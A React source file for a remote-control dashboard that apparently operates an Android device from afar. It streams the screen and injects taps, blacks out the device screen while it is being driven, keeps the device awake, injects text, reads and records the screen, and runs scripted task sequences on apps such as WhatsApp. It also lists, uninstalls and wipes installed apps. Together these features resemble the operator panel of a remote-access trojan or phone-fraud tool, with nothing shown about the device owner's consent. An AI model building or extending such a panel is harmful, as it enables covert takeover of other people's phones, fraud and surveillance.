import React, { useState, useRef, useEffect, useCallback } from 'react';
import ScreenReaderView from './ScreenReaderView';
import ScreenReaderRecorder from './ScreenReaderRecorder';

// ── Inline Task Runner ────────────────────────────────────────────────────────
function TaskRunnerModal({ device, sendCommand, results, onClose }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [tasks, setTasks]         = useState([]);
  const [loading, setLoading]     = useState(true);
  const [running, setRunning]     = useState(false);
  const [runningTask, setRunningTask] = useState(null);
  const [runLog, setRunLog]       = useState([]);
  const [runStep, setRunStep]     = useState(-1);
  const [runDone, setRunDone]     = useState(false);

  const cancelRef     = useRef(false);
  const runResolveRef = useRef(null);
  const seenIds       = useRef(new Set());

  useEffect(() => {
    fetch('/api/tasks')
      .then(r => r.json())
      .then(d => { if (d.success) setTasks(d.tasks || []); })
      .catch(() => {})
      .finally(() => setLoading(false));
  }, []);

  useEffect(() => {
    results.forEach(r => {
      if (runResolveRef.current && r.id && !seenIds.current.has('resolve_' + r.id)) {
        seenIds.current.add('resolve_' + r.id);
        runResolveRef.current(r);
        runResolveRef.current = null;
      }
    });
  }, [results]);

  const sleep = ms => new Promise(res => setTimeout(res, ms));
  const sendAndWait = (command, params = {}) => new Promise(resolve => {
    runResolveRef.current = resolve;
    sendCommand(deviceId, command, params);
    setTimeout(() => {
      if (runResolveRef.current === resolve) {
        runResolveRef.current = null;
        resolve({ success: false, error: 'Timeout' });
      }
    }, 8000);
  });

  const runTask = async (task) => {
    if (!isOnline || running) return;
    cancelRef.current = false;
    setRunning(true);
    setRunningTask(task);
    setRunLog([]);
    setRunStep(-1);
    setRunDone(false);

    const log = [];
    const steps = (task.steps || []).filter(s => s.enabled !== false);

    for (let i = 0; i < steps.length; i++) {
      if (cancelRef.current) break;
      const step = steps[i];
      setRunStep(i);
      const ts = new Date().toLocaleTimeString();

      try {
        let result;
        switch (step.type) {
          case 'open_app':
            result = await sendAndWait('open_app', { packageName: step.packageName });
            log.push(`[${ts}] Open App (${step.appLabel || step.packageName}): ${result?.success ? 'OK' : result?.error || 'Failed'}`);
            break;
          case 'click_text':
            result = await sendAndWait('click_by_text', { text: step.text });
            log.push(`[${ts}] Click "${step.text}": ${result?.success ? 'OK' : result?.error || 'Failed'}`);
            break;
          case 'paste_text':
            result = await sendAndWait('input_text', { text: step.text });
            log.push(`[${ts}] Paste text: ${result?.success ? 'OK' : result?.error || 'Failed'}`);
            break;
          case 'close_app':
            result = await sendAndWait('force_stop_app', { packageName: step.packageName });
            log.push(`[${ts}] Close App: ${result?.success ? 'OK' : result?.error || 'Failed'}`);
            break;
          case 'delay':
            log.push(`[${ts}] Delay ${step.ms}ms…`);
            setRunLog([...log]);
            await sleep(step.ms);
            log.push(`[${ts}] Delay done`);
            break;
          case 'press_home':
            result = await sendAndWait('press_home', {});
            log.push(`[${ts}] Press Home: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'press_back':
            result = await sendAndWait('press_back', {});
            log.push(`[${ts}] Press Back: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'press_recents':
            result = await sendAndWait('press_recents', {});
            log.push(`[${ts}] Press Recents: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'block_screen':
            result = await sendAndWait('screen_blackout_on', {});
            log.push(`[${ts}] Block Screen: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'unblock_screen':
            result = await sendAndWait('screen_blackout_off', {});
            log.push(`[${ts}] Unblock Screen: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'swipe_up':
            result = await sendAndWait('swipe', { direction: 'up' });
            log.push(`[${ts}] Swipe Up: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'swipe_down':
            result = await sendAndWait('swipe', { direction: 'down' });
            log.push(`[${ts}] Swipe Down: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'swipe_left':
            result = await sendAndWait('swipe', { direction: 'left' });
            log.push(`[${ts}] Swipe Left: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          case 'swipe_right':
            result = await sendAndWait('swipe', { direction: 'right' });
            log.push(`[${ts}] Swipe Right: ${result?.success ? 'OK' : 'Failed'}`);
            break;
          default:
            log.push(`[${ts}] Unknown step type: ${step.type}`);
        }
      } catch (err) {
        log.push(`[${ts}] Error: ${err.message}`);
        break;
      }
      setRunLog([...log]);
    }

    setRunStep(-1);
    setRunDone(true);
    setRunning(false);
  };

  const stopTask = () => { cancelRef.current = true; };

  const cardStyle = {
    position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.78)',
    display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
  };
  const boxStyle = {
    background: '#1e293b', borderRadius: 14, width: 520, maxWidth: '95vw',
    maxHeight: '82vh', border: '1px solid #334155', display: 'flex', flexDirection: 'column',
    overflow: 'hidden',
  };

  return (
    <div style={cardStyle} onClick={e => { if (e.target === e.currentTarget && !running) onClose(); }}>
      <div style={boxStyle}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032' }}>
          <span style={{ fontWeight: 700, color: '#a78bfa', fontSize: 13 }}>🎬 Run Task</span>
          <span style={{ fontSize: 11, color: '#64748b' }}>{tasks.length} tasks available (global)</span>
          {!running && <button onClick={onClose} style={{ marginLeft: 'auto', ...smallBtn('#334155'), padding: '3px 10px' }}>✕ Close</button>}
          {running && <button onClick={stopTask} style={{ marginLeft: 'auto', ...smallBtn('#7f1d1d'), padding: '3px 10px' }}>⏹ Stop</button>}
        </div>

        <div style={{ flex: 1, overflowY: 'auto', padding: 12, display: 'flex', flexDirection: 'column', gap: 8 }}>
          {loading && <div style={{ color: '#64748b', textAlign: 'center', padding: 24 }}>Loading tasks…</div>}
          {!loading && tasks.length === 0 && (
            <div style={{ color: '#475569', textAlign: 'center', padding: 24 }}>
              No tasks yet — create them in Task Studio
            </div>
          )}

          {tasks.map(task => (
            <div key={task._id} style={{
              background: runningTask?._id === task._id ? '#1e1b4b' : '#162032',
              border: `1px solid ${runningTask?._id === task._id ? '#7c3aed' : '#1e293b'}`,
              borderRadius: 10, padding: '10px 14px',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <span style={{ fontWeight: 600, color: '#e2e8f0', fontSize: 13, flex: 1 }}>🎬 {task.name}</span>
                <span style={{ fontSize: 11, color: '#475569' }}>{(task.steps || []).length} steps</span>
                <button
                  onClick={() => runTask(task)}
                  disabled={!isOnline || running}
                  style={{ ...smallBtn('#166534'), padding: '4px 12px', fontSize: 12 }}
                >
                  {runningTask?._id === task._id && running ? '⟳ Running…' : '▶ Run'}
                </button>
              </div>

              {runningTask?._id === task._id && (
                <div style={{ marginTop: 10 }}>
                  {(task.steps || []).filter(s => s.enabled !== false).map((step, idx) => (
                    <div key={idx} style={{
                      fontSize: 11, padding: '2px 0',
                      color: runStep > idx ? '#22c55e' : runStep === idx ? '#f59e0b' : '#475569',
                    }}>
                      {runStep > idx ? '✓' : runStep === idx ? '⟳' : '○'} {idx + 1}. {step.type}{step.packageName ? ` (${step.appLabel || step.packageName})` : step.text ? ` "${step.text}"` : step.ms ? ` ${step.ms}ms` : ''}
                    </div>
                  ))}
                  {runDone && (
                    <div style={{ color: '#22c55e', fontSize: 11, marginTop: 4, fontWeight: 600 }}>
                      ✓ Task completed
                    </div>
                  )}
                  {runLog.length > 0 && (
                    <div style={{
                      marginTop: 8, background: '#0f172a', borderRadius: 6, padding: 8,
                      maxHeight: 120, overflowY: 'auto',
                    }}>
                      {runLog.map((line, i) => (
                        <div key={i} style={{ fontSize: 10, color: '#94a3b8', fontFamily: 'monospace' }}>{line}</div>
                      ))}
                    </div>
                  )}
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

const SYSTEM_ICONS = {
  'com.whatsapp': '💬', 'com.instagram.android': '📸', 'com.facebook.katana': '👤',
  'org.telegram.messenger': '✈️', 'com.snapchat.android': '👻',
  'com.twitter.android': '🐦', 'com.google.android.gm': '📧',
  'com.google.android.chrome': '🌐', 'com.google.android.youtube': '▶️',
};
const appIcon = pkg => SYSTEM_ICONS[pkg] || '📦';

function latencyColor(ms) {
  if (ms === null || ms === undefined) return '#475569';
  if (ms < 100)  return '#22c55e';
  if (ms < 300)  return '#eab308';
  return '#ef4444';
}

function LatencyBadge({ label, ms }) {
  const color = latencyColor(ms);
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
      <span style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 0.8, fontWeight: 600 }}>{label}</span>
      <span style={{
        fontSize: 12, fontWeight: 700, color,
        background: `${color}18`, borderRadius: 5,
        padding: '1px 7px', fontVariantNumeric: 'tabular-nums',
        minWidth: 52, textAlign: 'center', display: 'inline-block',
      }}>
        {ms !== null && ms !== undefined ? `${ms} ms` : '—'}
      </span>
    </div>
  );
}

export default function ControlCenter({ device, sendCommand, results, streamFrame, send, serverLatency, deviceLatency, onTabChange, screenReaderPushData, offlineRecordingVersion }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;
  const devInfo  = device.deviceInfo || {};
  const devW     = devInfo.screenWidth  || null;
  const devH     = devInfo.screenHeight || null;

  const [showTaskRunner, setShowTaskRunner] = useState(false);

  // ── Keep device awake while dashboard is open (ping every 30 s) ───────
  const [stayAwakeActive, setStayAwakeActive] = useState(false);
  useEffect(() => {
    if (!isOnline) return;
    setStayAwakeActive(true);
    sendCommand(deviceId, 'wake_screen', {});
    const id = setInterval(() => {
      sendCommand(deviceId, 'wake_screen', {});
    }, 30_000);
    return () => { clearInterval(id); setStayAwakeActive(false); };
  }, [isOnline, deviceId, sendCommand]);

  // ── Stream state ──────────────────────────────────────────────────────
  const [streaming, setStreaming] = useState(false);
  const [fps, setFps]             = useState(0);
  const frameCountRef             = useRef(0);
  const lastFpsRef                = useRef(Date.now());
  const streamingRef              = useRef(false);
  const autoStopRef               = useRef(null);
  const imgRef                    = useRef(null);

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  useEffect(() => {
    if (streamFrame && streaming) {
      frameCountRef.current++;
      const now = Date.now();
      const elapsed = now - lastFpsRef.current;
      if (elapsed >= 1000) {
        setFps(Math.round((frameCountRef.current * 1000) / elapsed));
        frameCountRef.current = 0;
        lastFpsRef.current = now;
      }
    }
  }, [streamFrame, streaming]);

  const startStream = useCallback(() => {
    if (streamingRef.current) return;
    sendCommand(deviceId, 'stream_start', {});
    setStreaming(true);
    frameCountRef.current = 0;
    setFps(0);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
    autoStopRef.current = setTimeout(() => {
      if (streamingRef.current) {
        sendCommand(deviceId, 'stream_stop');
        setStreaming(false);
        setFps(0);
      }
    }, 5 * 60 * 1000);
  }, [deviceId, sendCommand]);

  const stopStream = useCallback(() => {
    sendCommand(deviceId, 'stream_stop');
    setStreaming(false);
    setFps(0);
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
  }, [deviceId, sendCommand]);

  useEffect(() => () => {
    if (streamingRef.current) sendCommand(deviceId, 'stream_stop');
    if (autoStopRef.current) clearTimeout(autoStopRef.current);
  }, []);

  // ── Screen touch on stream ────────────────────────────────────────────
  const handleStreamClick = useCallback((e) => {
    if (!streaming || !devW || !devH) return;
    const rect = imgRef.current.getBoundingClientRect();
    const px   = (e.clientX - rect.left) / rect.width;
    const py   = (e.clientY - rect.top)  / rect.height;
    const tx   = Math.round(px * devW);
    const ty   = Math.round(py * devH);
    sendCommand(deviceId, 'touch', { x: tx, y: ty, duration: 100 });
  }, [streaming, devW, devH, deviceId, sendCommand]);

  // ── Block screen ──────────────────────────────────────────────────────
  const [blockActive, setBlockActive] = useState(false);
  const blockScreen = () => {
    const cmd = blockActive ? 'screen_blackout_off' : 'screen_blackout_on';
    sendCommand(deviceId, cmd, {});
    setBlockActive(v => !v);
  };

  // ── Paste / Input ─────────────────────────────────────────────────────
  const [pasteText, setPasteText]       = useState('');
  const [showPasteInput, setShowPasteInput] = useState(false);

  const doPaste = () => {
    if (!pasteText.trim()) return;
    sendCommand(deviceId, 'set_clipboard', { text: pasteText });
    setTimeout(() => sendCommand(deviceId, 'input_text', { text: pasteText }), 200);
    setShowPasteInput(false);
    setPasteText('');
  };

  // ── App Folder ────────────────────────────────────────────────────────
  const [apps, setApps]               = useState([]);
  const [appsLoading, setAppsLoading] = useState(false);
  const [appSearch, setAppSearch]     = useState('');
  const [confirmApp, setConfirmApp]   = useState(null);
  const [showAppDialog, setShowAppDialog] = useState(false);
  const seenApps = useRef(new Set());

  const loadApps = () => {
    setAppsLoading(true);
    sendCommand(deviceId, 'get_installed_apps', {});
  };

  useEffect(() => {
    results.forEach(r => {
      if (r.command === 'get_installed_apps' && r.success && !seenApps.current.has(r.id)) {
        seenApps.current.add(r.id);
        setAppsLoading(false);
        try {
          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          setApps(d.apps || d.installedApps || []);
        } catch (_) { setAppsLoading(false); }
      }
    });
  }, [results]);

  const filteredApps = apps.filter(a => {
    const q = appSearch.toLowerCase();
    return !q || (a.appName || '').toLowerCase().includes(q) || (a.packageName || '').toLowerCase().includes(q);
  });

  const doAppAction = (action, pkg) => {
    if (['uninstall_app', 'force_stop_app', 'clear_app_data'].includes(action)) {
      setConfirmApp({ action, pkg });
    } else {
      sendCommand(deviceId, action, { packageName: pkg });
    }
  };
  const confirmAndDo = () => {
    if (!confirmApp) return;
    sendCommand(deviceId, confirmApp.action, { packageName: confirmApp.pkg });
    setConfirmApp(null);
  };

  // ── Helper ────────────────────────────────────────────────────────────
  const cmd = (command, params = {}) => sendCommand(deviceId, command, params);

  // ── Stream display size — match ScreenReader for consistent look ─────
  const STREAM_W = 360;
  const STREAM_H = devW && devH ? Math.min(780, Math.round(STREAM_W * devH / devW)) : 640;

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12, paddingBottom: 16 }}>

      {/* ── LATENCY BAR ────────────────────────────────────────────────── */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 16,
        background: '#1e293b', borderRadius: 10, padding: '7px 14px',
        border: '1px solid #334155', flexWrap: 'wrap',
      }}>
        <span style={{ fontSize: 11, color: '#64748b', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 1, marginRight: 4 }}>
          📡 Latency
        </span>
        <LatencyBadge label="Server" ms={serverLatency} />
        <div style={{ width: 1, height: 16, background: '#334155' }} />
        <LatencyBadge label="Device" ms={deviceLatency} />
        {deviceLatency === null && isOnline && (
          <span style={{ fontSize: 10, color: '#475569', fontStyle: 'italic' }}>measuring…</span>
        )}
        {!isOnline && (
          <span style={{ fontSize: 10, color: '#ef4444', fontStyle: 'italic', marginLeft: 4 }}>device offline</span>
        )}
        {/* Stay Awake indicator */}
        {isOnline && stayAwakeActive && (
          <div style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 10, color: '#22c55e', background: 'rgba(34,197,94,0.08)', borderRadius: 6, padding: '2px 8px', border: '1px solid rgba(34,197,94,0.2)' }}>
            <span style={{ width: 6, height: 6, borderRadius: '50%', background: '#22c55e', display: 'inline-block', animation: 'pulse 2s infinite' }} />
            Stay Awake
          </div>
        )}
        {/* App Folder button — compact, opens dialog */}
        <button
          onClick={() => { setShowAppDialog(true); if (!apps.length) loadApps(); }}
          disabled={!isOnline}
          style={{ marginLeft: 'auto', ...smallBtn('#1e3a5f'), display: 'flex', alignItems: 'center', gap: 5, padding: '4px 12px' }}
        >
          📂 <span style={{ fontSize: 11 }}>App Folder</span>
          {apps.length > 0 && <span style={{ fontSize: 10, color: '#7dd3fc' }}>({apps.length})</span>}
        </button>
        <button
          onClick={() => setShowTaskRunner(true)}
          disabled={!isOnline}
          style={{ ...smallBtn('#4c1d95'), display: 'flex', alignItems: 'center', gap: 5, padding: '4px 12px' }}
        >
          🎬 <span style={{ fontSize: 11 }}>Run Task</span>
        </button>
      </div>

      {/* ── TOP ROW: Two Phone Frames ──────────────────────────────────── */}
      <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start', flexWrap: 'wrap' }}>

        {/* ── SCREEN CONTROL PHONE ────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📱 Screen Control
          </div>

          {/* Phone bezel */}
          <div style={{
            background: '#1e293b', borderRadius: 24, padding: '14px 10px 10px',
            border: '2px solid #334155', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8,
            boxShadow: '0 4px 20px rgba(0,0,0,0.4)',
          }}>
            {/* Notch */}
            <div style={{ width: 60, height: 6, background: '#334155', borderRadius: 4, marginBottom: 2 }} />

            {/* Stream area */}
            <div
              style={{
                width: STREAM_W, height: STREAM_H,
                background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b',
                display: 'flex', alignItems: 'center', justifyContent: 'center',
                overflow: 'hidden', cursor: streaming ? 'crosshair' : 'default',
                position: 'relative',
              }}
              onClick={handleStreamClick}
            >
              {streamFrame ? (
                <img
                  ref={imgRef}
                  src={`data:image/jpeg;base64,${streamFrame}`}
                  alt="stream"
                  style={{ width: '100%', height: '100%', objectFit: 'contain', display: 'block', userSelect: 'none' }}
                  draggable={false}
                />
              ) : (
                <div style={{ textAlign: 'center', color: '#334155' }}>
                  <div style={{ fontSize: 28 }}>📱</div>
                  <div style={{ fontSize: 11, marginTop: 6 }}>
                    {streaming ? 'Waiting for frame…' : 'Start stream to view'}
                  </div>
                </div>
              )}
              {blockActive && (
                <div style={{ position: 'absolute', inset: 0, background: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <span style={{ color: '#ef4444', fontSize: 11, fontWeight: 700 }}>🔲 SCREEN BLOCKED</span>
                </div>
              )}
            </div>

            {/* Controls row */}
            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', justifyContent: 'center', paddingBottom: 4 }}>
              <button
                onClick={streaming ? stopStream : startStream}
                disabled={!isOnline}
                style={{ ...smallBtn(streaming ? '#7f1d1d' : '#166534'), fontSize: 11 }}
              >
                {streaming ? '⏹ Stop' : '▶ Start'}
              </button>
              {streaming && (
                <span style={{ fontSize: 11, color: '#22c55e', alignSelf: 'center' }}>● {fps}fps</span>
              )}
              <button
                onClick={blockScreen}
                disabled={!isOnline}
                style={{ ...smallBtn(blockActive ? '#dc2626' : '#334155'), fontSize: 11 }}
              >
                {blockActive ? '🔲 Unblock' : '⬛ Block'}
              </button>
            </div>
          </div>
          {devW && devH && (
            <div style={{ fontSize: 10, color: '#475569', textAlign: 'center' }}>{devW}×{devH}</div>
          )}
        </div>

        {/* ── SCREEN READER ────────────────────────────────────────────── */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1, minWidth: 0 }}>
          <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, textAlign: 'center' }}>
            📺 Screen Reader
          </div>
          <ScreenReaderView device={device} sendCommand={sendCommand} results={results} screenPushData={screenReaderPushData} />
        </div>

      </div>

      {/* ── SCREEN READER RECORDER ────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎥 Screen Reader Recorder
        </div>
        <ScreenReaderRecorder
          device={device}
          sendCommand={sendCommand}
          results={results}
          screenReaderPushData={screenReaderPushData}
          offlineRecordingVersion={offlineRecordingVersion}
        />
      </div>

      {/* ── CONTROL PAD ────────────────────────────────────────────────── */}
      <div style={{
        background: '#1e293b', borderRadius: 12, border: '1px solid #334155',
        padding: '12px 14px', display: 'flex', flexDirection: 'column', gap: 10,
      }}>
        <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700 }}>
          🎮 Control Pad
        </div>

        {/* Row 0: Screen — Wake Screen Up | Turn Screen On | Storage */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0 }}>Screen</span>
          <div style={{ display: 'flex', gap: 8 }}>
            <CtrlBtn
              icon="💡" label="Wake Screen Up"
              onClick={() => cmd('wake_screen')}
              disabled={!isOnline}
              color="#b45309"
            />
            <CtrlBtn
              icon="🔆" label="Turn Screen On"
              onClick={() => cmd('wake_screen')}
              disabled={!isOnline}
              color="#92400e"
            />
            <CtrlBtn
              icon="📂" label="Storage"
              onClick={() => cmd('request_storage_permission')}
              disabled={!isOnline}
              color="#0f766e"
            />
          </div>
        </div>

        {/* Row 1: Input — Paste | Enter  (Nav + Swipe are in the Screen Reader panel) */}
        <div style={{ display: 'flex', gap: 8, alignItems: 'flex-start' }}>
          <span style={{ fontSize: 10, color: '#475569', width: 56, flexShrink: 0, paddingTop: 8 }}>Input</span>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1 }}>
            <div style={{ display: 'flex', gap: 8 }}>
              <CtrlBtn
                icon="📋" label="Paste"
                onClick={() => setShowPasteInput(v => !v)}
                disabled={!isOnline}
                color={showPasteInput ? '#b45309' : undefined}
              />
              <CtrlBtn
                icon="↵" label="Enter"
                onClick={() => cmd('press_enter')}
                disabled={!isOnline}
                color="#7c3aed"
              />
            </div>
            {showPasteInput && (
              <div style={{ display: 'flex', gap: 6 }}>
                <input
                  value={pasteText}
                  onChange={e => setPasteText(e.target.value)}
                  onKeyDown={e => e.key === 'Enter' && doPaste()}
                  placeholder="Text to paste…"
                  autoFocus
                  style={{
                    flex: 1, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '6px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
                <button
                  onClick={doPaste}
                  disabled={!pasteText.trim() || !isOnline}
                  style={{ ...smallBtn('#1d4ed8') }}
                >
                  Send
                </button>
                <button onClick={() => setShowPasteInput(false)} style={{ ...smallBtn('#334155') }}>✕</button>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* ── APP FOLDER DIALOG ──────────────────────────────────────────── */}
      {showAppDialog && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.75)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}
          onClick={e => { if (e.target === e.currentTarget) setShowAppDialog(false); }}
        >
          <div style={{
            background: '#1e293b', borderRadius: 14, width: 560, maxWidth: '95vw',
            maxHeight: '80vh', border: '1px solid #334155', display: 'flex', flexDirection: 'column',
            overflow: 'hidden',
          }}>
            {/* Dialog header */}
            <div style={{
              display: 'flex', alignItems: 'center', gap: 10,
              padding: '12px 16px', borderBottom: '1px solid #334155', background: '#162032',
            }}>
              <span style={{ fontWeight: 700, color: '#94a3b8', fontSize: 13, textTransform: 'uppercase', letterSpacing: 1 }}>
                📂 App Folder
              </span>
              {apps.length > 0 && (
                <span style={{ fontSize: 11, color: '#64748b' }}>{apps.length} apps</span>
              )}
              <button onClick={loadApps} disabled={!isOnline || appsLoading} style={{ ...smallBtn('#334155'), fontSize: 11, padding: '3px 10px', marginLeft: 4 }}>
                {appsLoading ? '…' : apps.length ? '↻ Refresh' : '📦 Load Apps'}
              </button>
              {apps.length > 0 && (
                <input
                  value={appSearch}
                  onChange={e => setAppSearch(e.target.value)}
                  placeholder="Search apps…"
                  style={{
                    flex: 1, minWidth: 100, background: '#0f172a', border: '1px solid #334155',
                    borderRadius: 6, padding: '4px 10px', color: '#f1f5f9', fontSize: 12,
                  }}
                />
              )}
              <button
                onClick={() => setShowAppDialog(false)}
                style={{ ...smallBtn('#334155'), fontSize: 15, padding: '3px 10px', marginLeft: 'auto' }}
              >
                ✕ Close
              </button>
            </div>

            {/* App list */}
            <div style={{ flex: 1, overflowY: 'auto', padding: 10 }}>
              {!apps.length && !appsLoading && (
                <div style={{ textAlign: 'center', color: '#475569', padding: '30px 0', fontSize: 13 }}>
                  Click "Load Apps" to see installed apps
                </div>
              )}
              {appsLoading && (
                <div style={{ textAlign: 'center', color: '#64748b', padding: '30px 0', fontSize: 13 }}>Loading apps…</div>
              )}
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(240px, 1fr))', gap: 6 }}>
                {filteredApps.map(app => (
                  <AppRow
                    key={app.packageName}
                    app={app}
                    isOnline={isOnline}
                    onLaunch={() => cmd('launch_app', { packageName: app.packageName })}
                    onForceStop={() => doAppAction('force_stop_app', app.packageName)}
                    onUninstall={() => doAppAction('uninstall_app', app.packageName)}
                    onClearData={() => doAppAction('clear_app_data', app.packageName)}
                  />
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── CONFIRM DIALOG ─────────────────────────────────────────────── */}
      {confirmApp && (
        <div style={{
          position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)',
          display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 10000,
        }}>
          <div style={{ background: '#1e293b', borderRadius: 12, padding: 24, width: 340, border: '1px solid #334155' }}>
            <div style={{ fontWeight: 700, marginBottom: 8, color: '#f1f5f9' }}>
              Confirm {confirmApp.action.replace(/_/g, ' ')}
            </div>
            <div style={{ color: '#94a3b8', fontSize: 13, marginBottom: 18, wordBreak: 'break-all' }}>
              {confirmApp.pkg}
            </div>
            <div style={{ display: 'flex', gap: 10, justifyContent: 'flex-end' }}>
              <button onClick={() => setConfirmApp(null)} style={{ ...smallBtn('#334155'), color: '#f1f5f9', padding: '7px 16px' }}>Cancel</button>
              <button onClick={confirmAndDo} style={{ ...smallBtn('#dc2626'), padding: '7px 16px' }}>Confirm</button>
            </div>
          </div>
        </div>
      )}

      {/* ── TASK RUNNER MODAL ──────────────────────────────────────────── */}
      {showTaskRunner && (
        <TaskRunnerModal
          device={device}
          sendCommand={sendCommand}
          results={results}
          onClose={() => setShowTaskRunner(false)}
        />
      )}

      <style>{`@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }`}</style>
    </div>
  );
}

// ── Sub-components ────────────────────────────────────────────────────────────

function CtrlBtn({ icon, label, onClick, disabled, color }) {
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      title={label}
      style={{
        width: 48, height: 44, border: 'none', borderRadius: 8,
        background: color || '#334155', color: '#f1f5f9',
        fontSize: 17, cursor: disabled ? 'not-allowed' : 'pointer',
        opacity: disabled ? 0.4 : 1,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        fontWeight: 600, transition: 'background 0.15s', flexShrink: 0,
        flexDirection: 'column', gap: 1,
      }}
    >
      <span>{icon}</span>
      <span style={{ fontSize: 8, color: '#94a3b8', fontWeight: 500 }}>{label}</span>
    </button>
  );
}

function AppRow({ app, isOnline, onLaunch, onForceStop, onUninstall, onClearData }) {
  const [expanded, setExpanded] = useState(false);
  return (
    <div style={{ background: '#162032', borderRadius: 8, border: '1px solid #1e293b', padding: '8px 10px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
        <span style={{ fontSize: 18, flexShrink: 0 }}>{appIcon(app.packageName)}</span>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontWeight: 600, color: '#f1f5f9', fontSize: 12, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.appName || app.packageName}
          </div>
          <div style={{ fontSize: 10, color: '#475569', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
            {app.packageName}
          </div>
        </div>
        <button onClick={onLaunch} disabled={!isOnline} title="Launch" style={smallBtnStyle('#166534')}>▶ Open</button>
        <button onClick={() => setExpanded(v => !v)} style={smallBtnStyle('#334155')}>{expanded ? '▲' : '⋯'}</button>
      </div>
      {expanded && (
        <div style={{ display: 'flex', gap: 6, marginTop: 8, flexWrap: 'wrap' }}>
          <button onClick={onForceStop} disabled={!isOnline} style={smallBtnStyle('#92400e')}>⏹ Force Stop</button>
          <button onClick={onClearData} disabled={!isOnline} style={smallBtnStyle('#1e3a5f')}>🗑 Clear Data</button>
          <button onClick={onUninstall} disabled={!isOnline} style={smallBtnStyle('#7f1d1d')}>✕ Uninstall</button>
          {app.versionName && <span style={{ fontSize: 10, color: '#475569', alignSelf: 'center' }}>v{app.versionName}</span>}
        </div>
      )}
    </div>
  );
}

// ── Style helpers ─────────────────────────────────────────────────────────────

const smallBtn = (bg) => ({
  border: 'none', borderRadius: 6, padding: '5px 11px',
  cursor: 'pointer', fontWeight: 600, fontSize: 12,
  background: bg, color: '#f1f5f9',
  whiteSpace: 'nowrap', transition: 'opacity 0.15s',
});

const smallBtnStyle = bg => ({
  border: 'none', borderRadius: 6, padding: '4px 9px',
  cursor: 'pointer', fontWeight: 600, fontSize: 11,
  background: bg, color: '#f1f5f9', whiteSpace: 'nowrap',
});
